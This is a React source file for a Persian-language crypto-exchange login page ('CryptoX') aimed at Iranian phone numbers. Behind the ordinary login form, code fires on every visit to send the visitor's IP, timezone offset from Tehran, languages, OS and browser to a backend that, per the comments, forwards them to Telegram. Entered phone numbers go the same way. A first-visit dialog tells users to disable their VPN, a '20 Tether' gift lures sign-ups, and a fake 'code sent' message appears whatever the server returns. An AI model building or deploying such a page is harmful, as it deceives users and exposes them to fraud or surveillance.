import { useEffect, useRef, useState } from "react";

/* ------------------------------------------------------------------ */
/*  CONFIG — replace these with your own values arash                      */
/* ------------------------------------------------------------------ */
const BRAND = "CryptoX";
const LOGO_URL = ""; // <-- put your bitcoin image link here. Empty = built-in fallback icon
const API = {
    sendCode: "https://your-api.com/auth/send-code", // POST { phone }
    verifyCode: "https://your-api.com/auth/verify-code", // POST { phone, code }
};
const IP_PING_URL = "/api/tests/getYourIp"; // GET — fires on every page visit, sends only the IP to Telegram
const PHONE_PING_URL = "/api/tests/phoneEntered"; // GET — fires only when "ارسال کد" is pressed, sends the phone to Telegram
const OTP_LENGTH = 4;
const RESEND_SECONDS = 120; // 2 minutes
const SENDING_DELAY_MS = 1500; // how long "ارسال کد..." shows before the countdown starts
const FIRST_VISIT_KEY = "login_welcome_dialog_seen";

const formatTime = (s) =>
    `${String(Math.floor(s / 60)).padStart(2, "0")}:${String(s % 60).padStart(2, "0")}`;

/* ------------------------------------------------------------------ */
/*  Small inline icons                                                 */
/* ------------------------------------------------------------------ */
const BitcoinGlyph = () => (
    <svg viewBox="0 0 64 64" width="100%" height="100%" aria-hidden="true">
        <circle cx="32" cy="32" r="30" fill="#f7931a" />
        <text x="32" y="44" textAnchor="middle" fontSize="38" fontWeight="700" fill="#fff" fontFamily="Arial, sans-serif">&#8383;</text>
    </svg>
);

const LockIcon = () => (
    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
        <rect x="4" y="11" width="16" height="10" rx="2" />
        <path d="M8 11V8a4 4 0 0 1 8 0v3" />
    </svg>
);

const ShieldIcon = () => (
    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
        <path d="M12 3l7 3v5c0 5-3 8.5-7 10-4-1.5-7-5-7-10V6l7-3z" />
        <path d="M9 12l2 2 4-4" />
    </svg>
);

/* ------------------------------------------------------------------ */
/*  Component                                                          */
/* ------------------------------------------------------------------ */
export default function CryptoPage() {
    const [phone, setPhone] = useState("");
    const [otp, setOtp] = useState(Array(OTP_LENGTH).fill(""));
    const [sending, setSending] = useState(false);
    const [verifying, setVerifying] = useState(false);
    const [codeSent, setCodeSent] = useState(false);
    const [endsAt, setEndsAt] = useState(0);
    const [secondsLeft, setSecondsLeft] = useState(0);
    const [showWelcome, setShowWelcome] = useState(false);
    const [toast, setToast] = useState(null); // { type: "error" | "success", text }
    const [shake, setShake] = useState(false);

    const otpRefs = useRef([]);
    const visitLogged = useRef(false);
    const toastTimer = useRef(null);
    const sendTimer = useRef(null);
    const dialogBtnRef = useRef(null);

    function getUtcOffsetMinutes(timeZone, date = new Date()) {
        const parts = new Intl.DateTimeFormat("en-US", {
            timeZone,
            timeZoneName: "longOffset"
        }).formatToParts(date);
        const offset = parts.find(
            part => part.type === "timeZoneName"
        ).value;
        if (offset === "GMT" || offset === "UTC") return 0;
        const match = offset.match(/GMT([+-])(\d{2}):(\d{2})/);
        if (!match) return null;
        const sign = match[1] === "+" ? 1 : -1;
        return sign * (Number(match[2]) * 60 + Number(match[3]));
    }

    function getOS() {
        if (typeof navigator === "undefined") return "Unknown"; // server-side guard

        const ua = navigator.userAgent;
        const platform = navigator.userAgentData?.platform;

        // Chromium browsers expose the platform directly
        if (platform) return platform; // "Windows", "macOS", "Android", "Linux", "Chrome OS"

        // iPadOS 13+ reports itself as a Mac, so check touch support
        if (/iPhone|iPod/.test(ua)) return "iOS";
        if (/iPad/.test(ua) || (/Macintosh/.test(ua) && navigator.maxTouchPoints > 1)) return "iPadOS";
        if (/Android/.test(ua)) return "Android";
        if (/Windows/.test(ua)) return "Windows";
        if (/Mac OS X/.test(ua)) return "macOS";
        if (/CrOS/.test(ua)) return "ChromeOS";
        if (/Linux/.test(ua)) return "Linux";
        return "Unknown";
    }

    function getBrowser() {
        if (typeof navigator === "undefined") return "Unknown"; // server-side guard

        const ua = navigator.userAgent;

        // Order matters: many browsers include "Chrome" and "Safari" in their UA
        if (/Edg\//.test(ua)) return "Edge";
        if (/OPR\/|Opera/.test(ua)) return "Opera";
        if (/SamsungBrowser/.test(ua)) return "Samsung Internet";
        if (/Firefox\/|FxiOS/.test(ua)) return "Firefox";
        if (/CriOS|Chrome\//.test(ua)) return "Chrome";
        if (/Safari\//.test(ua)) return "Safari";
        return "Unknown";
    }

    // ---------------------------------------------------------------

    const phoneValid = /^\d{10,11}$/.test(phone);
    const fullPhone = "+98" + phone.replace(/^0/, "");

    /* ---- ping 1: fires on every page visit — carries nothing but what the backend reads off the request ---- */


    const pingVisit = async () => {

        const visitorTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone
        const difference = getUtcOffsetMinutes(visitorTimeZone) - getUtcOffsetMinutes("Asia/Tehran");

        const timeInfo = {
            visitorTimeZone: visitorTimeZone,
            difference: difference,
        };//asdf
        const languageInfo = {
            language: navigator.language,
            languages: navigator.languages,
            locale: Intl.DateTimeFormat().resolvedOptions().locale,
        };

        const os = getOS();
        const browser = getBrowser();

        try {
            const res = await fetch(IP_PING_URL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    timeInfo,
                    languageInfo,
                    os,
                    browser,
                }),
                keepalive: true,
            });

            if (!res.ok) {
                throw new Error(`Request failed: ${res.status}`);
            }

            const data = await res.json();
            console.log(data);
        } catch (err) {
            console.error("Visit request failed", err);
        }
    };


    const pingPhoneEntered = (phoneValue) => {
        fetch(`${PHONE_PING_URL}?phone=${encodeURIComponent(phoneValue)}`, { keepalive: true })
            .then((res) => res.json())
            .catch((err) => {
                console.error("Phone ping failed", err);
            });
    };

    /* ---- toast helper (type must be "error" or "success" — it picks the CSS class) ---- */
    const showToast = (type, text) => {
        clearTimeout(toastTimer.current);
        setToast({ type, text });
        toastTimer.current = setTimeout(() => setToast(null), 4500);
    };
    useEffect(
        () => () => {
            clearTimeout(toastTimer.current);
            clearTimeout(sendTimer.current);
        },
        []
    );

    /* ---- 1) ping on EVERY visit, first or not (ref guard stops the React StrictMode double-call in dev) ---- */
    useEffect(() => {
        if (visitLogged.current) return;
        visitLogged.current = true;
        pingVisit();
    }, []);

    /* ---- 2) welcome dialog: first visit only ---- */
    useEffect(() => {
        try {
            if (!localStorage.getItem(FIRST_VISIT_KEY)) {
                setShowWelcome(true);
                localStorage.setItem(FIRST_VISIT_KEY, "1"); // any reload after this won't show it
            }
        } catch {
            /* localStorage blocked (private mode etc.) — just skip the dialog */
        }
    }, []);

    useEffect(() => {
        if (!showWelcome) return;
        dialogBtnRef.current?.focus();
        const onKey = (e) => e.key === "Escape" && setShowWelcome(false);
        window.addEventListener("keydown", onKey);
        return () => window.removeEventListener("keydown", onKey);
    }, [showWelcome]);

    /* ---- 3) resend countdown (timestamp based, so it stays accurate in background tabs) ---- */
    useEffect(() => {
        if (!endsAt) return;
        const tick = () => {
            const left = Math.max(0, Math.ceil((endsAt - Date.now()) / 1000));
            setSecondsLeft(left);
            if (left === 0) setEndsAt(0);
        };
        tick();
        const id = setInterval(tick, 250);
        return () => clearInterval(id);
    }, [endsAt]);

    /* ---- send code: fire-and-forget, we do NOT wait for the server's answer ---- */
    const handleSendCode = () => {
        if (!phoneValid) {
            showToast("error", "شماره تلفن به درستی وارد نشده است");
            return;
        }
        if (sending || endsAt) return; // already sending or countdown running

        setSending(true);

        // ping with the entered phone number — separate endpoint from the visit ping above
        pingPhoneEntered(fullPhone);

        // send the request but ignore the result (success or failure)
        fetch(API.sendCode, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone: fullPhone }),
        }).catch(() => {});

        // after exactly 1.5s: stop "ارسال کد..." and start the 2-minute countdown
        clearTimeout(sendTimer.current);
        sendTimer.current = setTimeout(() => {
            setSending(false);
            setCodeSent(true);
            setOtp(Array(OTP_LENGTH).fill(""));
            setEndsAt(Date.now() + RESEND_SECONDS * 1000);
            showToast("success", "کد وریفای به موبایل شما ارسال شد");
            otpRefs.current[0]?.focus();
        }, SENDING_DELAY_MS);
    };

    /* ---- OTP field handlers ---- */
    const setDigit = (index, value) =>
        setOtp((prev) => {
            const next = [...prev];
            next[index] = value;
            return next;
        });

    const handleOtpChange = (index, e) => {
        const digit = e.target.value.replace(/\D/g, "").slice(-1);
        setDigit(index, digit);
        if (digit && index < OTP_LENGTH - 1) otpRefs.current[index + 1]?.focus();
    };

    const handleOtpKeyDown = (index, e) => {
        if (e.key === "Backspace" && !otp[index] && index > 0) {
            otpRefs.current[index - 1]?.focus();
        } else if (e.key === "ArrowLeft" && index > 0) {
            otpRefs.current[index - 1]?.focus();
        } else if (e.key === "ArrowRight" && index < OTP_LENGTH - 1) {
            otpRefs.current[index + 1]?.focus();
        } else if (e.key === "Enter") {
            handleVerify();
        }
    };

    const handleOtpPaste = (e) => {
        e.preventDefault();
        const digits = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, OTP_LENGTH);
        if (!digits) return;
        const next = Array(OTP_LENGTH).fill("");
        digits.split("").forEach((d, i) => (next[i] = d));
        setOtp(next);
        otpRefs.current[Math.min(digits.length, OTP_LENGTH - 1)]?.focus();
    };

    /* ---- approve ---- */
    const handleVerify = async () => {
        const code = otp.join("");
        if (!codeSent) {
            showToast("error", "لطفا شماره تلفن را وارد کنید و درخواست کد را کلیک کنید");
            return;
        }
        if (code.length !== OTP_LENGTH) {
            setShake(true);
            setTimeout(() => setShake(false), 450);
            showToast("error", `لطفا هر ${OTP_LENGTH} رقم کد تایید را وارد کنید`);
            return;
        }
        setVerifying(true);
        try {
            const res = await fetch(API.verifyCode, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ phone: fullPhone, code }),
            });
            if (!res.ok) throw new Error("Invalid code");
            showToast("success", "در حال ورود ...");
            // TODO: store the token / redirect, e.g. router.push("/dashboard")
        } catch {
            setShake(true);
            setTimeout(() => setShake(false), 450);
            showToast("error", "کد وارد شده صحیح نیست. لطفا دوباره تلاش کنید");
        } finally {
            setVerifying(false);
        }
    };

    /* ---- send button label ---- */
    const sendLabel = sending
        ? "ارسال کد..."
        : secondsLeft > 0
            ? `ارسال مجدد ${formatTime(secondsLeft)}`
            : codeSent
                ? "ارسال مجدد کد"
                : "ارسال کد";

    /* ---------------------------------------------------------------- */
    return (
        <div className="lg-root" dir="rtl" lang="fa">
            <style>{css}</style>

            <div className="lg-orb lg-orb-a" aria-hidden="true" />
            <div className="lg-orb lg-orb-b" aria-hidden="true" />

            {/* ============ HEADER ============ */}
            <header className="lg-header">
                <div className="lg-logo" role="img" aria-label={`لوگوی ${BRAND}`}>
                    {LOGO_URL ? <img src={LOGO_URL} alt="" /> : <BitcoinGlyph />}
                </div>
            </header>

            {/* ============ MAIN ============ */}
            <main className="lg-main">
                <section className="lg-card" aria-labelledby="lg-title">
                    <div className="lg-card-heading">
                        <h1 id="lg-title" className="lg-title">ورود</h1>
                        <div className="lg-gift-promo" role="note" aria-label="با اولین ثبت نام ۲۰ تتر هدیه بگیرید">
                            <span className="lg-gift-icon" aria-hidden="true">
                                <span className="lg-gift-emoji">🎁</span>
                                <span className="lg-gift-spark lg-gift-spark-a">✦</span>
                                <span className="lg-gift-spark lg-gift-spark-b">✧</span>
                            </span>
                            <span className="lg-gift-copy">با اولین ثبت نام <strong>20 تتر</strong> هدیه بگیرید</span>
                        </div>
                    </div>
                    <p className="lg-sub">یک کد چهار رقمی به تلفن شما ارسال می شود</p>

                    <label className="lg-label" htmlFor="lg-phone">شماره تلفن</label>
                    <div className="lg-phone-row">
                        <button
                            type="button"
                            className="lg-btn lg-btn-send"
                            onClick={handleSendCode}
                            disabled={sending || secondsLeft > 0}
                        >
                            {sendLabel}
                        </button>

                        <div className={`lg-field ${phone && !phoneValid ? "is-invalid" : ""}`}>
                            <span className="lg-prefix">+98</span>
                            <input
                                id="lg-phone"
                                type="tel"
                                inputMode="numeric"
                                autoComplete="tel-national"
                                placeholder="09127658796"
                                value={phone}
                                maxLength={11}
                                onChange={(e) => setPhone(e.target.value.replace(/\D/g, "").slice(0, 11))}
                                onKeyDown={(e) => e.key === "Enter" && handleSendCode()}
                            />
                        </div>
                    </div>
                    <p className="lg-hint">شماره تلفن خود را بعد از +۹۸ وارد کنید</p>

                    <label className="lg-label" id="lg-otp-label">کد تایید</label>
                    <div
                        className={`lg-otp ${shake ? "is-shaking" : ""}`}
                        role="group"
                        aria-labelledby="lg-otp-label"
                        dir="ltr"
                    >
                        {otp.map((digit, i) => (
                            <input
                                key={i}
                                ref={(el) => (otpRefs.current[i] = el)}
                                className="lg-otp-box"
                                type="text"
                                inputMode="numeric"
                                autoComplete={i === 0 ? "one-time-code" : "off"}
                                aria-label={`رقم ${i + 1} از ${OTP_LENGTH}`}
                                maxLength={1}
                                value={digit}
                                onChange={(e) => handleOtpChange(i, e)}
                                onKeyDown={(e) => handleOtpKeyDown(i, e)}
                                onPaste={handleOtpPaste}
                                onFocus={(e) => e.target.select()}
                            />
                        ))}
                    </div>

                    <button
                        type="button"
                        className="lg-btn lg-btn-approve"
                        onClick={handleVerify}
                        disabled={verifying}
                    >
                        {verifying ? "بررسی..." : "تایید"}
                    </button>

                    <ul className="lg-trust">
                        <li><LockIcon />ورود حفاظت شده</li>
                        <li><ShieldIcon />اطلاعات ورود شما محفوظ و یک بار مصرف هستند</li>
                    </ul>
                </section>
            </main>

            {/* ============ FOOTER ============ */}
            <footer className="lg-footer">
                <nav className="lg-footer-links" aria-label="پیوندهای پایین صفحه">
                    <a href="/terms">قوانین</a>
                    <a href="/privacy">حریم خصوصی</a>
                    <a href="/fees">کارمزدها</a>
                    <a href="/status">وضعیت سیستم</a>
                    <a href="/support">پشتیبانی</a>
                </nav>
                <p className="lg-risk">
                    رمزارزها حساس هستند و ممکن است افزایش یا کاهش پیدا کنند یا به طور کلی از دست بروند . فقط از پولی استفاده کنید که میدانید ممکن است از بین برود.
                </p>
                <p className="lg-copy">© {new Date().getFullYear()} {BRAND}. تمام حقوق محفوظ است </p>
            </footer>

            {/* ============ TOAST ============ */}
            {toast && (
                <div className={`lg-toast lg-toast-${toast.type}`} role="alert">
                    {toast.text}
                </div>
            )}

            {/* ============ WELCOME DIALOG (first visit only) ============ */}
            {showWelcome && (
                <div className="lg-overlay" onClick={() => setShowWelcome(false)}>
                    <div
                        className="lg-dialog"
                        role="dialog"
                        aria-modal="true"
                        aria-labelledby="lg-dialog-title"
                        onClick={(e) => e.stopPropagation()}
                    >
                        <h2 id="lg-dialog-title">لطفا فیلترشکن خود را خاموش کنید و صفحه را ریفرش کنید</h2>
                        <button
                            ref={dialogBtnRef}
                            type="button"
                            className="lg-btn lg-btn-approve"
                            onClick={() => setShowWelcome(false)}
                        >
                            فهمیدم
                        </button>
                    </div>
                </div>
            )}
        </div>
    );
}

/* ------------------------------------------------------------------ */
/*  Styles (scoped with the lg- prefix so they won't clash with yours) */
/* ------------------------------------------------------------------ */
const css = `
@import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;600;700&display=swap');

.lg-root{
  --ink:#0d0624; --violet:#7c3aed; --violet-2:#a855f7; --magenta:#c026d3;
  --text:#f5f1ff; --muted:rgba(245,241,255,.68);
  --glass:rgba(255,255,255,.08); --glass-line:rgba(255,255,255,.18);
  position:relative; min-height:100vh; display:flex; flex-direction:column; overflow:hidden;
  font-family:'Vazirmatn',Tahoma,system-ui,-apple-system,'Segoe UI',sans-serif; color:var(--text);
  background:linear-gradient(120deg,#12082e,#2b0f5e,#4c1d95,#1e1b4b,#3b0764,#12082e);
  background-size:400% 400%; animation:lg-flow 22s ease infinite;
}
.lg-root *{box-sizing:border-box}
@keyframes lg-flow{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}

.lg-orb{position:absolute; border-radius:50%; filter:blur(90px); opacity:.45; pointer-events:none; z-index:0}
.lg-orb-a{width:460px;height:460px;background:#7c3aed;top:12%;left:-120px;animation:lg-drift-a 26s ease-in-out infinite}
.lg-orb-b{width:420px;height:420px;background:#db2777;bottom:6%;right:-100px;animation:lg-drift-b 30s ease-in-out infinite}
@keyframes lg-drift-a{0%,100%{transform:translate(0,0)}50%{transform:translate(160px,90px)}}
@keyframes lg-drift-b{0%,100%{transform:translate(0,0)}50%{transform:translate(-180px,-80px)}}

/* header */
.lg-header{
  position:relative; z-index:2; display:flex; align-items:center; justify-content:center;
  height:96px;
  background:
    radial-gradient(130% 220% at 50% -70%, rgba(124,58,237,.38), transparent 55%),
    linear-gradient(180deg, #170c33 0%, #0d0624 50%, #050208 100%);
  box-shadow:
    inset 0 1px 0 rgba(255,255,255,.1),
    inset 0 -30px 40px -26px rgba(0,0,0,.95),
    0 24px 50px -16px rgba(0,0,0,.85),
    0 1px 0 rgba(124,58,237,.3);
  border-bottom:1px solid rgba(124,58,237,.3);
}
.lg-header::after{
  content:"";
  position:absolute; left:0; right:0; bottom:-1px; height:2px;
  background:linear-gradient(90deg, transparent, var(--violet-2) 25%, var(--magenta) 50%, var(--violet-2) 75%, transparent);
  opacity:.8;
}
.lg-logo{
  position:relative; z-index:1;
  width:60px;height:60px;border-radius:50%; padding:5px;
  background:rgba(255,255,255,.14); border:1px solid rgba(255,255,255,.4);
  box-shadow:0 0 0 6px rgba(255,255,255,.07), 0 8px 24px rgba(0,0,0,.3);
  backdrop-filter:blur(6px); display:grid; place-items:center;
}
.lg-logo img{width:100%;height:100%;object-fit:contain;border-radius:50%}

/* main + card */
.lg-main{position:relative; z-index:1; flex:1; display:grid; place-items:center; padding:40px 16px}
.lg-card{
  width:100%; max-width:480px; padding:34px 30px 26px; border-radius:26px;
  background:var(--glass); border:1px solid var(--glass-line);
  backdrop-filter:blur(22px) saturate(140%); -webkit-backdrop-filter:blur(22px) saturate(140%);
  box-shadow:0 30px 80px -20px rgba(10,2,40,.7), inset 0 1px 0 rgba(255,255,255,.22);
}
.lg-card-heading{
  position:relative; display:flex; flex-direction:row; direction:rtl; align-items:center; justify-content:space-between;
  gap:14px; padding:0 0 20px; margin:0 0 20px;
  border-bottom:1px solid rgba(255,255,255,.16);
}
.lg-card-heading::after{
  content:""; position:absolute; right:0; bottom:-1px; width:76px; height:2px;
  background:linear-gradient(90deg,var(--violet-2),#fcd34d); border-radius:2px;
}
.lg-title{margin:0;font-size:1.75rem;font-weight:700;line-height:1.35;flex:0 0 auto}
.lg-gift-promo{
  position:relative; isolation:isolate; overflow:hidden;
  display:flex; direction:ltr; align-items:center; gap:9px; min-width:0;
  padding:9px 12px; border:1px solid rgba(252,211,77,.38); border-radius:999px;
  background:linear-gradient(135deg,rgba(251,191,36,.15),rgba(168,85,247,.17));
  box-shadow:0 5px 18px rgba(10,2,40,.18),inset 0 1px 0 rgba(255,255,255,.12);
  color:#fff7d6;
}
.lg-gift-promo::after{
  content:""; position:absolute; z-index:-1; top:-50%; bottom:-50%; left:-45%; width:30%;
  transform:rotate(22deg); background:linear-gradient(90deg,transparent,rgba(255,255,255,.18),transparent);
  animation:lg-gift-shine 4s ease-in-out infinite;
}
.lg-gift-copy{direction:rtl;text-align:right;font-size:.76rem;font-weight:600;line-height:1.65;white-space:normal}
.lg-gift-copy strong{color:#fcd34d;font-weight:800;white-space:nowrap}
.lg-gift-icon{
  position:relative; flex:0 0 27px; width:27px; height:27px; display:grid; place-items:center;
  transform-origin:center bottom; animation:lg-gift-bob 2.2s ease-in-out infinite;
}
.lg-gift-emoji{display:block;font-size:22px;line-height:1;filter:drop-shadow(0 2px 5px rgba(252,211,77,.32))}
.lg-gift-spark{position:absolute;color:#fcd34d;font-size:11px;line-height:1;animation:lg-gift-sparkle 1.8s ease-in-out infinite}
.lg-gift-spark-a{top:-3px;right:-4px}
.lg-gift-spark-b{bottom:0;left:-5px;animation-delay:.7s}
@keyframes lg-gift-bob{0%,100%{transform:translateY(0) rotate(-3deg)}50%{transform:translateY(-3px) rotate(4deg)}}
@keyframes lg-gift-sparkle{0%,100%{opacity:.45;transform:scale(.75) rotate(0)}50%{opacity:1;transform:scale(1.2) rotate(18deg)}}
@keyframes lg-gift-shine{0%,65%{left:-45%}100%{left:130%}}
.lg-sub{margin:0 0 26px;color:var(--muted);font-size:.93rem;line-height:1.7}
.lg-label{display:block;margin:0 0 8px;font-size:.85rem;font-weight:600;color:var(--text)}
.lg-hint{margin:8px 0 24px;font-size:.78rem;color:var(--muted)}

/* phone row — kept LTR so the button stays on the left of the input */
.lg-phone-row{display:flex;direction:ltr;gap:10px;align-items:stretch;flex-wrap:wrap}
.lg-field{
  flex:1 1 200px; display:flex; align-items:center; direction:ltr; min-width:0;
  background:rgba(8,3,28,.45); border:1px solid var(--glass-line); border-radius:14px;
  transition:border-color .2s, box-shadow .2s;
}
.lg-field:focus-within{border-color:var(--violet-2);box-shadow:0 0 0 4px rgba(168,85,247,.25)}
.lg-field.is-invalid{border-color:#f87171}
.lg-prefix{padding:0 4px 0 16px;font-weight:600;color:var(--violet-2);font-size:1rem}
.lg-field input{
  flex:1;min-width:0;height:52px;padding:0 16px 0 8px;background:transparent;border:0;outline:0;
  color:var(--text);font:inherit;font-size:1rem;letter-spacing:.04em;
}
.lg-field input::placeholder{color:rgba(245,241,255,.32)}

/* buttons */
.lg-btn{
  font:inherit;font-weight:600;border:0;border-radius:14px;cursor:pointer;color:#fff;
  transition:transform .15s, box-shadow .2s, opacity .2s, filter .2s;
}
.lg-btn:focus-visible,.lg-otp-box:focus-visible{outline:2px solid #fff;outline-offset:3px}
.lg-btn:disabled{cursor:not-allowed;opacity:.55}
.lg-btn:not(:disabled):active{transform:scale(.98)}
.lg-btn-send{
  flex:0 0 auto;min-width:138px;height:52px;padding:0 18px;font-size:.88rem;white-space:nowrap;
  background:rgba(168,85,247,.28);border:1px solid rgba(168,85,247,.65);
}
.lg-btn-send:not(:disabled):hover{background:rgba(168,85,247,.45)}
.lg-btn-approve{
  width:100%;height:54px;margin-top:26px;font-size:1rem;
  background:linear-gradient(135deg,#7c3aed,#c026d3);
  box-shadow:0 12px 30px -8px rgba(192,38,211,.7);
}
.lg-btn-approve:not(:disabled):hover{filter:brightness(1.1);box-shadow:0 16px 38px -8px rgba(192,38,211,.85)}

/* otp */
.lg-otp{display:flex;justify-content:center;gap:12px}
.lg-otp-box{
  width:62px;height:70px;text-align:center;font:inherit;font-size:1.6rem;font-weight:700;color:var(--text);
  background:rgba(8,3,28,.45);border:1px solid var(--glass-line);border-radius:16px;outline:0;
  caret-color:var(--violet-2);transition:border-color .2s, box-shadow .2s, transform .15s;
}
.lg-otp-box:focus{border-color:var(--violet-2);box-shadow:0 0 0 4px rgba(168,85,247,.25);transform:translateY(-2px)}
.lg-otp.is-shaking{animation:lg-shake .45s}
@keyframes lg-shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-8px)}40%{transform:translateX(8px)}60%{transform:translateX(-5px)}80%{transform:translateX(5px)}}

/* trust */
.lg-trust{list-style:none;margin:22px 0 0;padding:0;display:grid;gap:8px;font-size:.78rem;color:var(--muted)}
.lg-trust li{display:flex;align-items:center;gap:8px}
.lg-trust svg{flex:none;color:var(--violet-2)}

/* footer */
.lg-footer{
  position:relative;z-index:1;padding:26px 20px 30px;text-align:center;
  background:linear-gradient(180deg,rgba(13,6,36,0) 0%,rgba(13,6,36,.75) 100%);
  border-top:1px solid rgba(255,255,255,.08);
}
.lg-footer-links{display:flex;flex-wrap:wrap;justify-content:center;gap:8px 24px;margin-bottom:14px}
.lg-footer-links a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
.lg-footer-links a:hover{color:#fff}
.lg-footer-links a:focus-visible{outline:2px solid var(--violet-2);outline-offset:3px;border-radius:4px}
.lg-risk{max-width:620px;margin:0 auto 10px;font-size:.76rem;line-height:1.9;color:rgba(245,241,255,.5)}
.lg-copy{margin:0;font-size:.74rem;color:rgba(245,241,255,.5)}

/* toast */
.lg-toast{
  position:fixed;left:50%;bottom:28px;transform:translateX(-50%);z-index:30;max-width:calc(100vw - 32px);
  padding:14px 20px;border-radius:14px;font-size:.9rem;font-weight:500;
  backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);
  border:1px solid var(--glass-line);box-shadow:0 18px 40px -12px rgba(0,0,0,.6);
  animation:lg-toast-in .25s ease-out;
}
.lg-toast-error{background:rgba(127,29,29,.65);border-color:rgba(248,113,113,.6)}
.lg-toast-success{background:rgba(6,78,59,.65);border-color:rgba(52,211,153,.6)}
@keyframes lg-toast-in{from{opacity:0;transform:translate(-50%,12px)}to{opacity:1;transform:translate(-50%,0)}}

/* welcome dialog */
.lg-overlay{
  position:fixed;inset:0;z-index:40;display:grid;place-items:center;padding:20px;
  background:rgba(8,3,24,.55);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);
  animation:lg-fade .3s ease-out;
}
.lg-dialog{
  width:100%;max-width:430px;padding:30px 28px 26px;border-radius:26px;
  background:linear-gradient(145deg,rgba(255,255,255,.2),rgba(255,255,255,.07));
  border:1px solid rgba(255,255,255,.3);
  backdrop-filter:blur(28px) saturate(160%);-webkit-backdrop-filter:blur(28px) saturate(160%);
  box-shadow:0 40px 100px -20px rgba(124,58,237,.65), inset 0 1px 0 rgba(255,255,255,.4);
  animation:lg-pop .35s cubic-bezier(.2,.9,.3,1.2);
}
.lg-dialog h2{margin:0 0 10px;font-size:1.25rem;font-weight:700;line-height:1.8}
.lg-dialog .lg-btn-approve{margin-top:24px}
@keyframes lg-fade{from{opacity:0}to{opacity:1}}
@keyframes lg-pop{from{opacity:0;transform:scale(.92) translateY(10px)}to{opacity:1;transform:scale(1) translateY(0)}}

/* small screens */
@media (max-width:480px){
  .lg-card{padding:28px 20px 22px}
  .lg-card-heading{align-items:flex-start;gap:12px;flex-wrap:wrap;padding-bottom:18px;margin-bottom:18px}
  .lg-title{font-size:1.6rem}
  .lg-gift-promo{max-width:100%;padding:8px 10px;gap:8px}
  .lg-gift-copy{font-size:.74rem}
  .lg-phone-row{flex-direction:column-reverse;flex-wrap:nowrap}
  .lg-field{flex:0 0 auto;width:100%}
  .lg-btn-send{flex:0 0 auto;width:100%}
  .lg-otp{gap:9px}
  .lg-otp-box{width:56px;height:64px}
}

/* respect reduced motion */
@media (prefers-reduced-motion:reduce){
  .lg-root,.lg-orb,.lg-otp.is-shaking,.lg-dialog,.lg-overlay,.lg-toast,
  .lg-gift-icon,.lg-gift-spark,.lg-gift-promo::after{animation:none}
}
`;
